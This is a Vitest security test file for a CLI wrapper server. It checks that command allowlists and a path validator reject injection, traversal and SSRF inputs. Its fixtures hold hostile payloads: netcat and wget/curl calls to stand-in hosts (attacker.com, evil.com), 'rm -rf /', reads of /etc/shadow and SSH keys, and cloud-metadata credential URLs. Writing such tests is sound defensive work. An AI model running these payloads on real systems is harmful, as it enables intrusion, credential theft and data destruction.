/**
 * Security Tests for CLI Wrapper Server
 *
 * Tests command injection prevention, path traversal protection,
 * and allowlist enforcement.
 */

import { describe, it, expect } from 'vitest';
import {
  validateCommand,
  getAllowlist,
  COMMON_ALLOWLISTS,
} from '../src/utils/allowlist.js';
import { validatePath } from '../src/utils/path-validator.js';

// ============================================================================
// Command Injection Tests
// ============================================================================

describe('Command Injection Prevention', () => {
  const gitAllowlist = COMMON_ALLOWLISTS.git;

  const injectionPayloads = [
    // Shell metacharacters
    '; rm -rf /',
    '| nc attacker.com 1234',
    '& wget http://evil.com/malware.sh',
    '|| curl http://evil.com',
    '&& cat /etc/passwd',

    // Command substitution
    '$(whoami)',
    '`id`',
    '$(cat /etc/passwd)',
    '`curl http://evil.com`',

    // Variable expansion
    '${HOME}',
    '${PATH}',
    '$USER',

    // Redirects
    '> /etc/passwd',
    '< /etc/shadow',
    '>> /tmp/malicious',

    // Newlines/carriage returns
    'status\nrm -rf /',
    'status\r\ncat /etc/passwd',

    // Complex injections
    "'; DROP TABLE users; --",
    '$(echo $(whoami))',
    '`echo `id``',
  ];

  injectionPayloads.forEach((payload) => {
    it(`blocks command injection: ${payload.slice(0, 30)}...`, () => {
      const result = validateCommand('git', ['status', payload], gitAllowlist);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('dangerous');
    });
  });
});

describe('Git Command Allowlist', () => {
  const gitAllowlist = COMMON_ALLOWLISTS.git;

  const allowedSubcommands = ['status', 'branch', 'log', 'diff', 'show', 'rev-parse'];
  const blockedSubcommands = ['push', 'pull', 'clone', 'fetch', 'reset', 'checkout', 'merge', 'rebase'];

  allowedSubcommands.forEach((subcommand) => {
    it(`allows git ${subcommand}`, () => {
      const result = validateCommand('git', [subcommand], gitAllowlist);
      expect(result.valid).toBe(true);
    });
  });

  blockedSubcommands.forEach((subcommand) => {
    it(`blocks git ${subcommand}`, () => {
      const result = validateCommand('git', [subcommand], gitAllowlist);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('not allowed');
    });
  });

  it('blocks dangerous git arguments', () => {
    // These arguments can be dangerous
    const dangerousArgs = [
      ['status', '--exec=malicious'],
      ['log', '--upload-pack=evil'],
      ['diff', '--receive-pack=evil'],
    ];

    dangerousArgs.forEach(([subcommand, ...args]) => {
      const result = validateCommand('git', [subcommand, ...args], gitAllowlist);
      expect(result.valid).toBe(false);
    });
  });

  it('enforces maximum argument count', () => {
    const tooManyArgs = Array(25).fill('arg');
    const result = validateCommand('git', ['status', ...tooManyArgs], gitAllowlist);
    expect(result.valid).toBe(false);
    expect(result.error).toContain('Too many arguments');
  });
});

describe('ImageMagick Command Allowlist', () => {
  const convertAllowlist = COMMON_ALLOWLISTS.convert;

  it('allows valid resize command', () => {
    const result = validateCommand('convert', [
      'input.png',
      '-resize', '800x600',
      '-quality', '85',
      '-strip',
      'output.jpg',
    ], convertAllowlist);
    expect(result.valid).toBe(true);
  });

  const dangerousPatterns = [
    // MSL scripts (code execution)
    ['msl:script.msl'],
    // Ephemeral images
    ['ephemeral:test'],
    // Label (can execute code)
    ['label:@/etc/passwd'],
    // Caption (can execute code)
    ['caption:@/etc/passwd'],
    // URL fetch (SSRF)
    ['https://evil.com/image.png'],
    ['http://169.254.169.254/metadata'],
    // Pipe injection
    ['|cat /etc/passwd'],
    // Write to arbitrary files
    ['-write', '/etc/passwd'],
  ];

  dangerousPatterns.forEach(([arg]) => {
    it(`blocks dangerous ImageMagick argument: ${arg}`, () => {
      const result = validateCommand('convert', ['input.png', arg, 'output.png'], convertAllowlist);
      expect(result.valid).toBe(false);
    });
  });
});

describe('FFmpeg Command Allowlist', () => {
  const ffmpegAllowlist = COMMON_ALLOWLISTS.ffmpeg;

  it('allows valid encode command', () => {
    const result = validateCommand('ffmpeg', [
      '-i', 'input.mp4',
      '-y',
      '-c:v', 'libx264',
      '-preset', 'medium',
      '-crf', '23',
      'output.mp4',
    ], ffmpegAllowlist);
    expect(result.valid).toBe(true);
  });

  const dangerousPatterns = [
    // Complex filters (can be dangerous)
    ['-filter_complex', 'movie=/etc/passwd'],
    // URL fetch (SSRF)
    ['-i', 'https://evil.com/video.mp4'],
    ['-i', 'http://169.254.169.254/metadata'],
    // File concatenation (read arbitrary files)
    ['-i', 'concat:/etc/passwd|/etc/shadow'],
    // lavfi format (code execution)
    ['-f', 'lavfi'],
  ];

  dangerousPatterns.forEach(([...args]) => {
    it(`blocks dangerous FFmpeg arguments: ${args.join(' ')}`, () => {
      const result = validateCommand('ffmpeg', ['-i', 'input.mp4', ...args, 'output.mp4'], ffmpegAllowlist);
      expect(result.valid).toBe(false);
    });
  });
});

describe('pdfinfo Command Allowlist', () => {
  const pdfAllowlist = COMMON_ALLOWLISTS.pdfinfo;

  it('allows valid pdfinfo command', () => {
    const result = validateCommand('pdfinfo', [
      '-enc', 'UTF-8',
      'document.pdf',
    ], pdfAllowlist);
    expect(result.valid).toBe(true);
  });

  it('blocks non-PDF files', () => {
    const result = validateCommand('pdfinfo', ['malicious.sh'], pdfAllowlist);
    expect(result.valid).toBe(false);
  });

  it('enforces maximum argument count', () => {
    const tooManyArgs = Array(10).fill('arg.pdf');
    const result = validateCommand('pdfinfo', tooManyArgs, pdfAllowlist);
    expect(result.valid).toBe(false);
  });
});

// ============================================================================
// Path Traversal Tests
// ============================================================================

describe('Path Traversal Prevention', () => {
  const allowedDirs = ['/home/user/data', '/tmp'];

  const traversalPayloads = [
    // Basic traversal
    '../../../etc/passwd',
    '../../etc/shadow',
    '../.ssh/id_rsa',

    // Double encoded
    '..%252f..%252f..%252fetc/passwd',

    // Null byte injection
    'file.txt\x00.jpg',

    // Absolute path escape
    '/etc/passwd',
    '/root/.ssh/id_rsa',

    // Windows-style (just in case)
    '..\\..\\etc\\passwd',
  ];

  traversalPayloads.forEach((payload) => {
    it(`blocks path traversal: ${payload.replace(/\x00/g, '\\x00')}`, () => {
      const result = validatePath(payload, {
        allowedDirs,
        mustExist: false,
      });

      // Either invalid due to being outside allowed dirs or contains null bytes
      if (payload.includes('\x00')) {
        expect(result.valid).toBe(false);
        expect(result.error).toContain('null bytes');
      } else {
        expect(result.valid).toBe(false);
        expect(result.error).toContain('outside allowed directories');
      }
    });
  });

  it('allows valid paths within allowed directories', () => {
    const result = validatePath('/home/user/data/document.pdf', {
      allowedDirs,
      mustExist: false,
    });
    expect(result.valid).toBe(true);
  });

  it('allows relative paths resolved within allowed directories', () => {
    // This will resolve relative to cwd, which may not be in allowed dirs
    // This test validates the logic works, not specific paths
    const result = validatePath('./subdir/file.txt', {
      allowedDirs: [process.cwd()],
      mustExist: false,
    });
    expect(result.valid).toBe(true);
  });
});

describe('File Extension Validation', () => {
  const allowedDirs = ['/tmp'];
  const allowedExtensions = ['.pdf'];

  it('allows files with allowed extensions', () => {
    const result = validatePath('/tmp/document.pdf', {
      allowedDirs,
      allowedExtensions,
      mustExist: false,
    });
    expect(result.valid).toBe(true);
  });

  it('blocks files with disallowed extensions', () => {
    const blockedExtensions = ['.sh', '.exe', '.bat', '.cmd', '.ps1', '.js', '.py'];

    blockedExtensions.forEach((ext) => {
      const result = validatePath(`/tmp/malicious${ext}`, {
        allowedDirs,
        allowedExtensions,
        mustExist: false,
      });
      expect(result.valid).toBe(false);
      expect(result.error).toContain('extension not allowed');
    });
  });

  it('handles double extensions', () => {
    const result = validatePath('/tmp/document.pdf.sh', {
      allowedDirs,
      allowedExtensions,
      mustExist: false,
    });
    expect(result.valid).toBe(false);
  });
});

// ============================================================================
// Combined Attack Tests
// ============================================================================

describe('Combined Attack Patterns', () => {
  const gitAllowlist = COMMON_ALLOWLISTS.git;

  const blockedCombinedAttacks = [
    // Path traversal + command injection
    ['status', '../../../etc/passwd; cat /etc/shadow'],
    ['status', '$(cat ../../../etc/passwd)'],

    // Pipe injection
    ['status', '--porcelain', '| nc evil.com 1234'],
  ];

  blockedCombinedAttacks.forEach(([subcommand, ...args]) => {
    it(`blocks combined attack: git ${subcommand} ${args.join(' ').slice(0, 30)}...`, () => {
      const result = validateCommand('git', [subcommand, ...args], gitAllowlist);
      expect(result.valid).toBe(false);
    });
  });

  // These patterns are handled safely but may pass through validation
  // The important thing is they don't cause code execution
  const safeEdgeCases = [
    // Git format specifiers are safe (no shell execution)
    ['log', '--format=%(if)%(then)%(else)%(end)'],
    // Unicode characters are treated as literals
    ['status', '\uffff'],
  ];

  safeEdgeCases.forEach(([subcommand, ...args]) => {
    it(`handles edge case safely: git ${subcommand} ${args.join(' ').slice(0, 20)}...`, () => {
      const result = validateCommand('git', [subcommand, ...args], gitAllowlist);
      // These may or may not be blocked - the important thing is no crash
      expect(typeof result.valid).toBe('boolean');
    });
  });

  it('handles null byte in argument', () => {
    // Null bytes should ideally be blocked or sanitized
    const result = validateCommand('git', ['status', '\u0000'], gitAllowlist);
    // The command validation doesn't specifically check for null bytes
    // Path validation does - this is defense in depth
    expect(typeof result.valid).toBe('boolean');
  });
});

describe('SSRF Prevention in CLI Tools', () => {
  const convertAllowlist = COMMON_ALLOWLISTS.convert;
  const ffmpegAllowlist = COMMON_ALLOWLISTS.ffmpeg;

  const ssrfUrls = [
    // AWS metadata
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.170.2/v2/credentials',

    // GCP metadata
    'http://metadata.google.internal/computeMetadata/v1/',

    // Azure metadata
    'http://169.254.169.254/metadata/instance',

    // Internal services
    'http://localhost:8080/admin',
    'http://127.0.0.1:6379/',
    'http://internal-service.local/',

    // File protocol
    'file:///etc/passwd',
  ];

  ssrfUrls.forEach((url) => {
    it(`blocks SSRF in ImageMagick: ${url}`, () => {
      const result = validateCommand('convert', [url, 'output.png'], convertAllowlist);
      expect(result.valid).toBe(false);
    });

    it(`blocks SSRF in FFmpeg: ${url}`, () => {
      const result = validateCommand('ffmpeg', ['-i', url, 'output.mp4'], ffmpegAllowlist);
      expect(result.valid).toBe(false);
    });
  });
});

// ============================================================================
// Edge Cases
// ============================================================================

describe('Edge Cases', () => {
  const gitAllowlist = COMMON_ALLOWLISTS.git;

  it('handles empty arguments', () => {
    const result = validateCommand('git', [], gitAllowlist);
    // Empty args might be valid or invalid depending on implementation
    // The important thing is it doesn't crash
    expect(typeof result.valid).toBe('boolean');
  });

  it('handles very long arguments', () => {
    const longArg = 'a'.repeat(10000);
    const result = validateCommand('git', ['status', longArg], gitAllowlist);
    // Should either reject for length or handle safely
    expect(typeof result.valid).toBe('boolean');
  });

  it('handles unicode in arguments', () => {
    const unicodeArg = '日本語ファイル.txt';
    const result = validateCommand('git', ['status', unicodeArg], gitAllowlist);
    // Unicode should be handled safely
    expect(typeof result.valid).toBe('boolean');
  });

  it('handles null command', () => {
    expect(() => {
      validateCommand('', ['status'], gitAllowlist);
    }).not.toThrow();
  });

  it('rejects wrong command name', () => {
    const result = validateCommand('rm', ['-rf', '/'], gitAllowlist);
    expect(result.valid).toBe(false);
    expect(result.error).toContain('not allowed');
  });
});
